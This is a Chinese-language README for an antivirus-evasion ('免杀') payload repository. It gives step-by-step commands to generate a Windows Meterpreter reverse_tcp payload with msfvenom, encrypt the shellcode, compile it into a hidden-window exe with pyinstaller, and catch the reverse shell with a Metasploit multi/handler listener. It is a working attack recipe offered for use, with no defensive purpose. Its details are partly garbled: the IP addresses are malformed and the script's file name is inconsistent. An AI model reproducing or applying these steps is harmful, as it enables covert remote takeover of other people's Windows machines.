# payload
免杀

托管github.com/run-2-agoal/payload

tree

README.md

SL.py

SE.exe

requirements.txt



一、先使用kali生成payload.c

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.1681.238 lport=8899 -f c  -o  payload.c                                       //*这里我制作Windows系统的木马，用kali进行监听，kali的IP是192.168.1.1.238 监听8899端口*

二、Windows系统下加密payload.c 得到加密的shellcode

SE.exe    payload.c

![image-20220924120047681](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220924120047681.png)

三、将密文shellcode冒号后的字符复制替换到PL.py中的密文Shellcode

![image-20220924120418841](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220924120418841.png)

四、为编译PL.py提供的环境

Python>=3.8.0

pyinstaller

执行命令 /*在此文件下打开cmd*

pip install -r requirements.txt  //*换国内源安装速度更快*
pyinstaller -F -w PL.py //*将PL.py编译为exe文件*

生成的PL.exe文件在dist

五、监听

kali终端执行以下命令

msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0      //*192.168.1.238*
msf6 exploit(multi/handler) > set lport 8899
msf6 exploit(multi/handler) > run
